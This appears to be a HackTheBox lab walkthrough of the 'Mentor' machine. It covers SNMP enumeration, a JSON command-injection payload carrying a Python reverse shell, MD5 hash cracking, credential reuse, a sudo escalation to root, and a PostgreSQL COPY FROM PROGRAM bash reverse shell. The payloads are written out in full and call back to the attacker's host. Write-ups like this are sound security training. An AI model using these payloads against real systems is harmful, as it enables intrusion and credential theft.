+++
date = '2024-12-01T00:00:00+00:00'
draft = false
title = 'HackTheBox: Mentor Walkthrough'
tags = ['hackthebox', 'penetration-testing', 'web-exploitation', 'snmp', 'privilege-escalation']
categories = ['HackTheBox']
+++

# HackTheBox: Mentor Walkthrough

This is a detailed walkthrough of the Mentor machine (10.10.11.193) from HackTheBox, covering reconnaissance, enumeration, exploitation, and privilege escalation techniques.

## Initial Setup

First, let's set up our environment and add the target to our hosts file:

```bash
# Add to /etc/hosts
10.10.11.193 mentorquotes.htb

# Set up variables
LPORT=10.10.14.13
RPORT=10.10.11.193
```

## Reconnaissance

### Initial Ping Test

```bash
ping 10.10.11.193
```

### Nmap Scanning

Let's start with a comprehensive nmap scan to identify open ports and services:

```bash
sudo nmap -sC -sV -vv -oA nmap/mentor 10.10.11.193
```

**Results:**

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO6yWCATcj2UeU/SgSa+wK2fP5ixsrHb6pgufdO378n+BLNiDB6ljwm3U3PPdbdQqGZo1K7Tfsz+ejZj1nV80RY=
|   256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJjv9f3Jbxj42smHEXcChFPMNh1bqlAFHLi4Nr7w9fdv
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://mentorquotes.htb/
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Full Port Scan

```bash
nmap -p- -oA allports -vvv 10.10.11.193
```

### UDP Port Scan

```bash
sudo nmap -sU --min-rate 10000 10.10.11.193
```

**UDP Scan Results:**

```
PORT      STATE  SERVICE
161/udp   open   snmp
1050/udp  closed cma
20154/udp closed unknown
28122/udp closed unknown
32772/udp closed sometimes-rpc8
58002/udp closed unknown
```

Great! We found SNMP running on UDP port 161.

## Web Enumeration

### Port 80 - HTTP Service

Accessing `http://10.10.11.193:80` redirects to `http://mentorquotes.htb/`. This appears to be a Flask application based on the server headers:

```
HTTP/1.1 200 OK
Date: Wed, 14 May 2025 12:56:00 GMT
Server: Werkzeug/2.0.3 Python/3.6.9
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Connection: close
Content-Length: 5506
```

### Subdomain Enumeration

```bash
ffuf -u http://mentorquotes.htb -H 'HOST: FUZZ.mentorquotes.htb' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fw 18 -mc all
```

**Results:**
```
10.10.11.193 mentorquotes.htb api.mentorquotes.htb
```

We discovered an API subdomain! Let's add it to our hosts file:

```bash
10.10.11.193 mentorquotes.htb api.mentorquotes.htb
```

### API Enumeration

Visiting `http://api.mentorquotes.htb` reveals a FastAPI application:

![FastAPI Interface](/images/mentor-htb/mentor-01.png)

Accessing the documentation at `http://api.mentorquotes.htb/docs` shows the Swagger UI:

![API Documentation](/images/mentor-htb/mentor-02.png)

The API has several endpoints:

![API Endpoints](/images/mentor-htb/mentor-03.png)

![More API Endpoints](/images/mentor-htb/mentor-04.png)

### API Authentication

We need JWT authentication. Let's test the registration and login functionality:

![JWT Token](/images/mentor-htb/mentor-05.png)

We can get a JWT token by signing up and logging in:

```
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEyMzQ1NiIsImVtYWlsIjoiMTIzNEBleGFtcGxlLmNvbSJ9.2VA3k2okByNuNtJ0vfrpgzdVCbN5N4aV_0d1vdGg5vM
```

### API Fuzzing

Let's fuzz for additional endpoints:

```bash
ffuf -request api.req -request-proto http -w /opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt -mc all
```

![API Fuzzing Results](/images/mentor-htb/mentor-06.png)

We found additional endpoints including `/admin`:

![Admin Endpoints](/images/mentor-htb/mentor-07.png)

We can see there's a user `james@mentorquotes.htb`:

![James User](/images/mentor-htb/mentor-08.png)

## SNMP Enumeration

Let's enumerate the SNMP service we found on UDP port 161:

```bash
snmpwalk -v2c -c public 10.10.11.193
```

**Results:**
```
iso.3.6.1.2.1.1.1.0 = STRING: "Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (1555164) 4:19:11.64
iso.3.6.1.2.1.1.4.0 = STRING: "Me <admin@mentorquotes.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "mentor"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
```

### SNMP Community String Brute Force

Let's try different community strings:

```bash
python3 /opt/snmpbrute.py -t 10.10.11.193 -f /opt/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -b
```

Let's try the "internal" community string:

```bash
snmpbulkwalk -v2c -c internal 10.10.11.193 | tee bulkwalk.out
```

This reveals running processes with `hrSWRunPath`:

![SNMP Process Discovery](/images/mentor-htb/mentor-09.png)

**Critical Finding:** We discovered a hardcoded password in a process:

```
STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
```

Never put passwords as command line arguments!

![Password Discovery](/images/mentor-htb/mentor-10.png)

This shows that if we can modify the Python script, it will rerun the program.

![Script Execution](/images/mentor-htb/mentor-11.png)

## Exploitation

### Getting a Valid JWT Token

First, let's get a session ID for the `james` user:

![Session ID](/images/mentor-htb/mentor-12.png)

With a valid JWT token:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
```

Now we can access the admin endpoints:

![Admin Access](/images/mentor-htb/mentor-13.png)

![User List](/images/mentor-htb/mentor-14.png)

![Backup Endpoint](/images/mentor-htb/mentor-15.png)

![Command Injection](/images/mentor-htb/mentor-16.png)

### Command Injection via Backup Endpoint

The backup endpoint appears vulnerable to command injection. Let's prepare a reverse shell payload:

```bash
export RHOST="10.10.14.13";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

For use in JSON, we need to escape it:

```bash
export RHOST=\"10.10.14.13\";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'
```

**Sample Request:**

```json
{
    "path":"/etc/passwd;export RHOST=\"10.10.14.13\";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'"
}
```

Set up a netcat listener:

```bash
rlwrap nc -nlvp 9001
```

### Using nohup for Background Execution

Since the server has limited workers, we need to use nohup to avoid hanging:

```http
POST /admin/backup HTTP/1.1
Host: api.mentorquotes.htb
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhbGciOiJIUzI1NiJ9ImphbWVzIiwIjZW1haWwiOiJjaGVyb0BjbHViLmNvbSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4KTI3NTkyMn0.pe6pmshcfF66bimHkTYBX0Hmj5m87Sk5kcjwWb0--Na0
Content-Type: application/json

{
  "path": "/etc/passwd; export RHOST=\"10.10.14.13\"; export RPORT=9001; \
nohup python -c 'import sys,socket,os,pty;s=socket.socket(); \
s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\")))); \
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")' #"
}
```

## Post-Exploitation

### Container Analysis

Once we get a shell, we're in a Docker container. Let's examine the environment:

```bash
# View Dockerfile
cat Dockerfile
```

```dockerfile
FROM python:3.6.9-alpine

RUN apk --update --upgrade add --no-cache  gcc musl-dev jpeg-dev zlib-dev libffi-dev cairo-dev pango-dev gdk-pixbuf-dev

WORKDIR /app
ENV HOME /home/svc
ENV PATH /home/svc/.local/bin:${PATH}
RUN python -m pip install --upgrade pip --user svc
COPY requirements.txt requirements.txt
RUN pip install -r requirements.txt
RUN pip install pydantic[email] pyjwt
EXPOSE 8000
COPY . .
CMD ["python3", "-m", "uvicorn", "app.main:app", "--reload", "--workers", "100", "--host", "0.0.0.0", "--port" ,"8000"]
```

### Database Configuration

```python
# /app/app/db.py
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
```

### Container Network

```bash
ip addr
```

```
11: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP
    link/ether 02:42:ac:16:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.22.0.3/16 brd 172.22.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

The container is running with only 2 workers, which causes the server to hang:

![Container Processes](/images/mentor-htb/mentor-17.png)

### Extracting User Credentials

From the API endpoints, we can extract user data including password hashes:

```json
[
  {
    "id": 1,
    "email": "james@mentorquotes.htb",
    "username": "james",
    "password": "7ccdcd8c05b59add9c198d492b36a503"
  },
  {
    "id": 2,
    "email": "svc@mentorquotes.htb",
    "username": "service_acc",
    "password": "53f22d0dfa10dce7e29cd31f4f953fd8"
  }
]
```

### Hash Cracking

Using CrackStation, we can crack the MD5 hashes:

```
53f22d0dfa10dce7e29cd31f4f953fd8:MD5:123meunomeeivani
```

## Privilege Escalation

### SSH Access

With the cracked password, we can SSH to the service account:

```bash
sshpass -p '123meunomeeivani' ssh service_acc@10.10.11.193 -t bash
# or
ssh svc@10.10.11.193
```

### Host Enumeration

Let's check running processes:

```bash
ps -ef --forest | less -S
```

We can see Docker containers running:

```
root        1684    1269  0 18:44 ?        00:00:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.2 -container-port 5432
root        1794    1269  0 18:44 ?        00:00:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000
root        1918    1269  0 18:44 ?        00:00:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.4 -container-port 80
```

PostgreSQL is running on port 5432.

### Network Services

```bash
ss -tlnp
```

```
State          Recv-Q         Send-Q                  Local Address:Port                    Peer Address:Port         Process
LISTEN         0              4096                       172.22.0.1:81                           0.0.0.0:*
LISTEN         0              4096                    127.0.0.53%lo:53                           0.0.0.0:*
LISTEN         0              128                           0.0.0.0:22                           0.0.0.0:*
LISTEN         0              4096                       172.22.0.1:5432                         0.0.0.0:*
LISTEN         0              4096                        127.0.0.1:38173                        0.0.0.0:*
LISTEN         0              4096                       172.22.0.1:8000                         0.0.0.0:*
LISTEN         0              511                                 *:80                                 *:*
LISTEN         0              128                              [::]:22                              [::]:*
```

### Apache Configuration

```bash
cat /etc/apache2/sites-available/000-default.conf
```

```apache
<VirtualHost *:80>
    ProxyPreserveHost On
    ServerName mentorquotes.htb
    ServerAdmin admin@mentorquotes.htb
    ProxyPass / http://172.22.0.1:81/
    ProxyPassReverse / http://172.22.0.1:81/

    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^mentorquotes.htb$
    RewriteRule /.* http://mentorquotes.htb/ [R]

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:80>
    ServerName api.mentorquotes.htb
    ServerAdmin admin@mentorquotes.htb
    ProxyPass / http://172.22.0.1:8000/
    ProxyPassReverse / http://172.22.0.1:8000/
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

### Finding Configuration Files

Let's look for files modified around the SSH key creation date:

```bash
find /etc -type f -newermt 2022-06-03 ! -newermt 2022-06-14 -ls 2>/dev/null
```

### SNMP Configuration

```bash
grep -v '^#' /etc/snmp/snmpd.conf
```

**Critical Finding:**

```
createUser bootstrap MD5 SuperSecurePassword123__ DES
rouser bootstrap priv

com2sec AllUser default internal
group AllGroup v2c AllUser
view SystemView included .1.3.6.1.2.1.25.1.1
view AllView included .1
access AllGroup "" any noauth exact AllView none none
```

We found another password: `SuperSecurePassword123__`

### User Enumeration

```bash
cat /etc/passwd | grep sh
```

```
root:x:0:0:root:/root:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
svc:x:1001:1001:,,,:/home/svc:/bin/bash
james:x:1000:1000:,,,:/home/james:/bin/bash
fwupd-refresh:x:115:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
```

### Privilege Escalation to James

Let's try the SNMP password for the james user:

```bash
su james
# Password: SuperSecurePassword123__
```

### Sudo Privileges

```bash
sudo -l
```

```
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
```

### Root Access

Perfect! James can run `/bin/sh` as root:

```bash
sudo /bin/sh
```

![Root Shell](/images/mentor-htb/mentor-18.png)

![Root Flag](/images/mentor-htb/mentor-19.png)

## Additional Techniques

### Chisel for Port Forwarding

If we needed to access the PostgreSQL database remotely:

```bash
# On Kali machine
./chisel server -p 8001 --reverse -v

# On target machine
./chisel client 10.10.14.13:8001 R:5432:172.22.0.1:5432

# Connect to database
psql postgresql://postgres:postgres@127.0.0.1/mentorquotes_db
```

### PostgreSQL Command Execution

```sql
-- List databases
\l

-- List tables
\dt

-- View table structure
\d+ users

-- Create command execution table
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);

-- Execute system commands
COPY cmd_exec FROM PROGRAM 'hostname';
SELECT * FROM cmd_exec;

-- Reverse shell via PostgreSQL
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.8/9001 0>&1"';
```

### Docker Container Analysis

```bash
# List running containers
docker ps

# Access container
docker exec -it 29af sh

# Create archive of application
tar -cjvf app.tar.bz2 app

# Copy from container to host
docker cp 29af:/app.tar.bz2 /dev/shm/

# Extract and analyze
tar -xjvf app.tar.bz2
ls -l app/

# Search for credentials
grep -Ri "password\|secret\|key\|token" app/
```

## Summary

This walkthrough demonstrated:

1. **Reconnaissance**: Nmap scanning revealed SSH, HTTP, and SNMP services
2. **Web Enumeration**: Discovered API subdomain with FastAPI documentation
3. **SNMP Exploitation**: Found hardcoded password in process arguments
4. **API Exploitation**: Command injection via backup endpoint
5. **Container Escape**: Analysis of Docker environment
6. **Credential Harvesting**: Hash cracking and database access
7. **Privilege Escalation**: SNMP configuration revealed additional credentials
8. **Root Access**: Sudo privileges allowed elevation to root

**Key Lessons:**
- Never hardcode passwords in command line arguments
- SNMP can reveal sensitive system information
- API documentation can expose attack vectors
- Multiple privilege escalation paths often exist
- Container environments require different enumeration techniques

This machine effectively demonstrated real-world vulnerabilities including credential exposure, command injection, and misconfigurations leading to privilege escalation.